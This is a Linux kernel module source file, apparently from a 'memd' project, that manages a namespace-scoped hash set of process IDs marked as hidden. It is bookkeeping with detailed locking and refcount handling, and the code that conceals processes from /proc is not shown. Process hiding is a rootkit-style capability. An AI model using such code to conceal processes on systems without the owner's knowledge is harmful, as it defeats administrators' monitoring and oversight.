#include "memd_hide.h"

#include <linux/errno.h>
#include <linux/spinlock.h>
#include <linux/pid_namespace.h>
#include <linux/sched/task.h>
#include <linux/hash.h>
#include <linux/slab.h>
#include <linux/rcupdate.h>

#define MEMD_HIDE_HASH_BITS 8
#define MEMD_HIDE_HASH_SIZE (1 << MEMD_HIDE_HASH_BITS)

/* struct memd_hide_entry lives in memd_hide.h (single definition). */

struct memd_hide_ns_entry {
    struct hlist_node node;
    struct pid_namespace *ns;
    int count;
};

static struct hlist_head hide_hash[MEMD_HIDE_HASH_SIZE];
static struct hlist_head hide_ns_hash[MEMD_HIDE_HASH_SIZE];
static DEFINE_SPINLOCK(hide_lock);
static DEFINE_SPINLOCK(hide_ns_lock);
static int hide_total_count = 0;

/* Set once by memd_hide_clear (module exit): the set is draining and
 * no new entry may be published. Ioctls stay reachable until proto
 * cleanup, which runs after the clear, so without this an add racing
 * the sweep lands in an already-swept bucket and leaks. Checked under
 * the matching lock so a racing add can neither slip past the sweep
 * nor leak an ns entry. */
static int hide_shutdown = 0;

static inline unsigned int hide_hash_fn(pid_t pid, struct pid_namespace *ns)
 {
    return hash_long((unsigned long)pid ^ (unsigned long)ns, MEMD_HIDE_HASH_BITS);
}

static struct memd_hide_entry *hide_find_entry(pid_t pid, struct pid_namespace *ns)
 {
    struct memd_hide_entry *entry;
    unsigned int hash = hide_hash_fn(pid, ns);

    hlist_for_each_entry(entry, &hide_hash[hash], node) {
        if (entry->pid == pid && entry->ns == ns)
            return entry;
    }
    return NULL;
}

static struct memd_hide_ns_entry *hide_find_ns(struct pid_namespace *ns)
 {
    struct memd_hide_ns_entry *entry;
    unsigned int hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);

    hlist_for_each_entry(entry, &hide_ns_hash[hash], node) {
        if (entry->ns == ns)
            return entry;
    }
    return NULL;
}

int memd_hide_add(pid_t pid)
 {
    struct memd_hide_entry *entry;
    struct memd_hide_ns_entry *ns_entry;
    struct memd_hide_ns_entry *found;
    struct pid_namespace *ns;
    struct task_struct *task;
    unsigned long flags;
    unsigned int hash;
    unsigned int ns_hash;

    if (pid <= 0)
        return -EINVAL;

    rcu_read_lock();
    task = find_task_by_vpid(pid);
    if (!task) {
        rcu_read_unlock();
        return -ESRCH;
    }
    /* No task->pid_ns member exists upstream; the active namespace
     * (nsproxy->pid_ns_for_children) is the scoping equivalent. */
    ns = get_pid_ns(task_active_pid_ns(task));
    rcu_read_unlock();

    if (!ns)
        return -ESRCH;

    /* Allocate outside the spinlock (may sleep); freed on dup/full. */
    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        put_pid_ns(ns);
        return -ENOMEM;
    }
    ns_entry = kmalloc(sizeof(*ns_entry), GFP_KERNEL);

    spin_lock_irqsave(&hide_lock, flags);

    if (hide_shutdown) {
        spin_unlock_irqrestore(&hide_lock, flags);
        put_pid_ns(ns);
        kfree(entry);
        kfree(ns_entry);
        return -ESHUTDOWN;
    }

    if (hide_find_entry(pid, ns)) {
        spin_unlock_irqrestore(&hide_lock, flags);
        put_pid_ns(ns);
        kfree(entry);
        kfree(ns_entry);
        return 0;
    }

    if (hide_total_count >= MEMD_HIDE_MAX) {
        spin_unlock_irqrestore(&hide_lock, flags);
        put_pid_ns(ns);
        kfree(entry);
        kfree(ns_entry);
        return -ENOSPC;
    }

    entry->pid = pid;
    entry->ns = get_pid_ns(ns);
    entry->pid_struct = find_get_pid(pid);
    entry->flags = 0;

    hash = hide_hash_fn(pid, ns);
    hlist_add_head(&entry->node, &hide_hash[hash]);
    hide_total_count++;

    spin_unlock_irqrestore(&hide_lock, flags);

    /* Per-ns count is best-effort status; the entry above owns one ns
     * ref and this path still holds the original, so ns stays alive. */
    spin_lock_irqsave(&hide_ns_lock, flags);
    if (!hide_shutdown) {
        found = hide_find_ns(ns);
        if (found) {
            found->count++;
        } else if (ns_entry) {
            ns_entry->ns = get_pid_ns(ns);
            ns_entry->count = 1;
            ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
            hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
            ns_entry = NULL;
        }
    }
    spin_unlock_irqrestore(&hide_ns_lock, flags);
    kfree(ns_entry);

    put_pid_ns(ns);

    return 0;
}

int memd_hide_add_ns(pid_t pid, struct pid_namespace *ns)
 {
    struct memd_hide_entry *entry;
    struct memd_hide_ns_entry *ns_entry;
    struct memd_hide_ns_entry *found;
    unsigned long flags;
    unsigned int hash;
    unsigned int ns_hash;

    if (pid <= 0 || !ns)
        return -EINVAL;

    /* Caller must hold a ref on ns for the duration of this call. */
    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return -ENOMEM;
    ns_entry = kmalloc(sizeof(*ns_entry), GFP_KERNEL);

    spin_lock_irqsave(&hide_lock, flags);

    if (hide_shutdown) {
        spin_unlock_irqrestore(&hide_lock, flags);
        kfree(entry);
        kfree(ns_entry);
        return -ESHUTDOWN;
    }

    if (hide_find_entry(pid, ns)) {
        spin_unlock_irqrestore(&hide_lock, flags);
        kfree(entry);
        kfree(ns_entry);
        return 0;
    }

    if (hide_total_count >= MEMD_HIDE_MAX) {
        spin_unlock_irqrestore(&hide_lock, flags);
        kfree(entry);
        kfree(ns_entry);
        return -ENOSPC;
    }

    entry->pid = pid;
    entry->ns = get_pid_ns(ns);
    entry->pid_struct = find_get_pid(pid);
    entry->flags = 0;

    hash = hide_hash_fn(pid, ns);
    hlist_add_head(&entry->node, &hide_hash[hash]);
    hide_total_count++;

    spin_unlock_irqrestore(&hide_lock, flags);

    spin_lock_irqsave(&hide_ns_lock, flags);
    if (!hide_shutdown) {
        found = hide_find_ns(ns);
        if (found) {
            found->count++;
        } else if (ns_entry) {
            ns_entry->ns = get_pid_ns(ns);
            ns_entry->count = 1;
            ns_hash = hash_long((unsigned long)ns, MEMD_HIDE_HASH_BITS);
            hlist_add_head(&ns_entry->node, &hide_ns_hash[ns_hash]);
            ns_entry = NULL;
        }
    }
    spin_unlock_irqrestore(&hide_ns_lock, flags);
    kfree(ns_entry);
    return 0;
}

/* Reap entries for a pid whose task is gone (del fallback). An entry
 * with no live task hides nothing; leaving it would hide a future pid
 * reuse and pin a slot. Only stale entries are removed, so live
 * entries for the same numeric pid in other namespaces are untouched.
 * Returns 0 if anything was reaped, -ESRCH otherwise. */
static int hide_reap_stale(pid_t pid)
 {
    struct memd_hide_entry *cursor;
    struct memd_hide_entry *victim;
    struct memd_hide_ns_entry *ns_entry;
    struct memd_hide_ns_entry *gone;
    struct pid *pid_struct;
    struct pid_namespace *entry_ns;
    struct pid_namespace *gone_ns;
    struct task_struct *task;
    unsigned long flags;
    int reaped;
    int i;

    reaped = 0;
    for (i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        for (;;) {
            victim = NULL;
            spin_lock_irqsave(&hide_lock, flags);
            hlist_for_each_entry(cursor, &hide_hash[i], node) {
                if (cursor->pid != pid)
                    continue;
                /* RCU under a spinlock is legal (no sleep): a pure
                 * pointer chase. A NULL pid_struct never pinned a
                 * task, so it is stale by definition. */
                rcu_read_lock();
                task = cursor->pid_struct ?
                    pid_task(cursor->pid_struct, PIDTYPE_PID) : NULL;
                rcu_read_unlock();
                if (!task) {
                    victim = cursor;
                    break;
                }
            }
            if (victim) {
                hlist_del(&victim->node);
                hide_total_count--;
            }
            spin_unlock_irqrestore(&hide_lock, flags);

            if (!victim)
                break;

            pid_struct = victim->pid_struct;
            entry_ns = victim->ns;
            kfree(victim);
            if (pid_struct)
                put_pid(pid_struct);

            gone = NULL;
            gone_ns = NULL;
            spin_lock_irqsave(&hide_ns_lock, flags);
            ns_entry = hide_find_ns(entry_ns);
            if (ns_entry) {
                ns_entry->count--;
                if (ns_entry->count <= 0) {
                    hlist_del(&ns_entry->node);
                    gone = ns_entry;
                    gone_ns = ns_entry->ns;
                }
            }
            spin_unlock_irqrestore(&hide_ns_lock, flags);

            if (gone)
                kfree(gone);
            if (gone_ns)
                put_pid_ns(gone_ns);
            put_pid_ns(entry_ns);
            reaped++;
        }
    }
    return reaped ? 0 : -ESRCH;
}

int memd_hide_del(pid_t pid)
 {
    struct memd_hide_entry *entry;
    struct memd_hide_ns_entry *ns_entry;
    struct memd_hide_ns_entry *gone;
    struct pid_namespace *ns;
    struct task_struct *task;
    struct pid *pid_struct;
    struct pid_namespace *entry_ns;
    struct pid_namespace *gone_ns;
    unsigned long flags;

    if (pid <= 0)
        return -EINVAL;

    rcu_read_lock();
    task = find_task_by_vpid(pid);
    if (!task) {
        rcu_read_unlock();
        /* Subject is gone: the scoped entry (if any) is stale. Reap
         * it so a future pid reuse does not inherit the hide and the
         * slot does not leak; live entries in other namespaces are
         * left alone. */
        return hide_reap_stale(pid);
    }
    /* No task->pid_ns member exists upstream; the active namespace
     * (nsproxy->pid_ns_for_children) is the scoping equivalent. */
    ns = get_pid_ns(task_active_pid_ns(task));
    rcu_read_unlock();

    if (!ns)
        return hide_reap_stale(pid);

    spin_lock_irqsave(&hide_lock, flags);

    entry = hide_find_entry(pid, ns);
    if (!entry) {
        spin_unlock_irqrestore(&hide_lock, flags);
        put_pid_ns(ns);
        return -ESRCH;
    }

    /* Unlink under the lock; drop refs after unlock (put_pid_ns may
     * free the namespace and must not run under a spinlock). */
    hlist_del(&entry->node);
    hide_total_count--;
    pid_struct = entry->pid_struct;
    entry_ns = entry->ns;

    spin_unlock_irqrestore(&hide_lock, flags);

    if (pid_struct)
        put_pid(pid_struct);
    put_pid_ns(entry_ns);
    kfree(entry);

    gone = NULL;
    gone_ns = NULL;
    spin_lock_irqsave(&hide_ns_lock, flags);
    ns_entry = hide_find_ns(ns);
    if (ns_entry) {
        ns_entry->count--;
        if (ns_entry->count <= 0) {
            hlist_del(&ns_entry->node);
            gone = ns_entry;
            gone_ns = ns_entry->ns;
        }
    }
    spin_unlock_irqrestore(&hide_ns_lock, flags);

    if (gone)
        kfree(gone);
    if (gone_ns)
        put_pid_ns(gone_ns);
    put_pid_ns(ns);

    return 0;
}

void memd_hide_clear(void)
 {
    struct memd_hide_entry *entry;
    struct memd_hide_ns_entry *ns_entry;
    struct pid *pid_struct;
    struct pid_namespace *entry_ns;
    struct pid_namespace *gone_ns;
    unsigned long flags;
    int i;

    /* Freeze adds first (under hide_lock): any add that published
     * before this is still ahead of the sweep and will be popped;
     * any add after it fails closed. */
    spin_lock_irqsave(&hide_lock, flags);
    hide_shutdown = 1;
    spin_unlock_irqrestore(&hide_lock, flags);

    /* Pop one entry at a time: unlink under the lock, drop refs after
     * (put_pid/put_pid_ns may free and must not run under a spinlock). */
    for (i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        for (;;) {
            spin_lock_irqsave(&hide_lock, flags);
            if (hlist_empty(&hide_hash[i])) {
                spin_unlock_irqrestore(&hide_lock, flags);
                break;
            }
            entry = hlist_entry(hide_hash[i].first,
                                struct memd_hide_entry, node);
            hlist_del(&entry->node);
            hide_total_count--;
            spin_unlock_irqrestore(&hide_lock, flags);

            pid_struct = entry->pid_struct;
            entry_ns = entry->ns;
            kfree(entry);
            if (pid_struct)
                put_pid(pid_struct);
            put_pid_ns(entry_ns);
        }
    }

    for (i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        for (;;) {
            spin_lock_irqsave(&hide_ns_lock, flags);
            if (hlist_empty(&hide_ns_hash[i])) {
                spin_unlock_irqrestore(&hide_ns_lock, flags);
                break;
            }
            ns_entry = hlist_entry(hide_ns_hash[i].first,
                                   struct memd_hide_ns_entry, node);
            hlist_del(&ns_entry->node);
            spin_unlock_irqrestore(&hide_ns_lock, flags);

            gone_ns = ns_entry->ns;
            kfree(ns_entry);
            put_pid_ns(gone_ns);
        }
    }
}

int memd_hide_count(void)
 {
    int n;
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    n = hide_total_count;
    spin_unlock_irqrestore(&hide_lock, flags);
    return n;
}

bool memd_hide_contains(pid_t pid)
 {
    struct pid_namespace *ns;
    struct task_struct *task;
    bool found = false;
    unsigned long flags;

    rcu_read_lock();
    task = find_task_by_vpid(pid);
    if (!task) {
        rcu_read_unlock();
        return false;
    }
    /* No task->pid_ns member exists upstream; the active namespace
     * (nsproxy->pid_ns_for_children) is the scoping equivalent. */
    ns = get_pid_ns(task_active_pid_ns(task));
    rcu_read_unlock();

    if (!ns)
        return false;

    spin_lock_irqsave(&hide_lock, flags);
    found = hide_find_entry(pid, ns) != NULL;
    spin_unlock_irqrestore(&hide_lock, flags);

    put_pid_ns(ns);
    return found;
}

bool memd_hide_contains_ns(pid_t pid, struct pid_namespace *ns)
 {
    bool found = false;
    unsigned long flags;

    if (!ns)
        return false;

    spin_lock_irqsave(&hide_lock, flags);
    found = hide_find_entry(pid, ns) != NULL;
    spin_unlock_irqrestore(&hide_lock, flags);

    return found;
}

int memd_hide_get_ns_count(struct pid_namespace *ns)
 {
    struct memd_hide_ns_entry *entry;
    int count = 0;
    unsigned long flags;

    if (!ns)
        return 0;

    spin_lock_irqsave(&hide_ns_lock, flags);
    entry = hide_find_ns(ns);
    if (entry)
        count = entry->count;
    spin_unlock_irqrestore(&hide_ns_lock, flags);

    return count;
}

/* Locked snapshot for listers (ns == NULL: all namespaces). Lives here
 * so listers never touch hide_hash/hide_lock directly. */
int memd_hide_collect_pids(pid_t *buf, size_t buf_size, size_t *count,
                            struct pid_namespace *ns)
 {
    size_t copied = 0;
    unsigned long flags;
    int i;
    struct memd_hide_entry *entry;

    if (!buf || !count)
        return -EINVAL;

    *count = 0;

    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < MEMD_HIDE_HASH_SIZE; i++) {
        hlist_for_each_entry(entry, &hide_hash[i], node) {
            if ((!ns || entry->ns == ns) &&
                copied < buf_size / sizeof(pid_t)) {
                buf[copied++] = entry->pid;
            }
        }
    }
    *count = copied;
    spin_unlock_irqrestore(&hide_lock, flags);

    return 0;
}

/* Unlocked-iteration helpers for debugging only: no in-tree callers.
 * Traversal is locked, but the returned pointer is NOT pinned (no ref
 * taken), so it is only valid while the caller guarantees the entry's
 * lifetime by other means. */
struct memd_hide_entry *memd_hide_get_first(void)
 {
    int i;
    struct memd_hide_entry *entry;
    struct memd_hide_entry *found;
    unsigned long flags;

    found = NULL;
    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < MEMD_HIDE_HASH_SIZE && !found; i++) {
        hlist_for_each_entry(entry, &hide_hash[i], node) {
            found = entry;
            break;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return found;
}

struct memd_hide_entry *memd_hide_get_next(struct memd_hide_entry *entry)
 {
    struct memd_hide_entry *next;
    struct memd_hide_entry *found;
    unsigned int hash;
    unsigned int i;
    unsigned long flags;

    if (!entry)
        return NULL;

    found = NULL;
    spin_lock_irqsave(&hide_lock, flags);
    hash = hide_hash_fn(entry->pid, entry->ns);
    next = hlist_entry_safe(entry->node.next, typeof(*entry), node);
    if (next) {
        found = next;
    } else {
        for (i = hash + 1; i < MEMD_HIDE_HASH_SIZE && !found; i++) {
            hlist_for_each_entry(next, &hide_hash[i], node) {
                found = next;
                break;
            }
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return found;
}
/* kmod/memd/proc/memd_hide.c[∂] */
